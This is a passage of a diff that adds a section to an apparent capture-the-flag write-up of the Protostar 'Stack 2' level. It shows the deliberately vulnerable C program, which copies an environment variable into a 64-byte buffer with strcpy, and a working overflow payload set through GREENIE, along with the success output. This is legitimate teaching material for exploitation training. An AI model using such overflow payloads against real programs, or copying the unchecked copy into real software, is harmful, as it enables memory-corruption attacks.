@@ -272,4 +272,63 @@ you have correctly got the variable to the right value
 
 We solved it :D
 
+## Stack 2
+
+### Challenge description
+
+Stack2 looks at environment variables, and how they can be set.
+
+This level is at `/opt/protostar/bin/stack2`
+
+### Challenge source code
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+  char *variable;
+
+  variable = getenv("GREENIE");
+
+  if(variable == NULL) {
+      errx(1, "please set the GREENIE environment variable\n");
+  }
+
+  modified = 0;
+
+  strcpy(buffer, variable);
+
+  if(modified == 0x0d0a0d0a) {
+      printf("you have correctly modified the variable\n");
+  } else {
+      printf("Try again, you got 0x%08x\n", modified);
+  }
+
+}
+```
+
+### Challenge solution
+
+Ok, this time our payload should be stored in an environement variable.
+
+Its always 64 bytes long + the value in the comparaison.
+
+Let's set our payload.
+
+```bash
+user@protostar:/opt/protostar/bin$ export GREENIE=$(perl -e 'print "A" x 64 . "\x0a\x0d\x0a\x0d"')
+```
+
+> Note : \x0a\x0d\x0a\x0d is how hexadecimal bytes are represented , notice that they are in reverse order (little endian)
+
+```bash
+user@protostar:/opt/protostar/bin$ ./stack2
+you have correctly modified the variable
+```
 
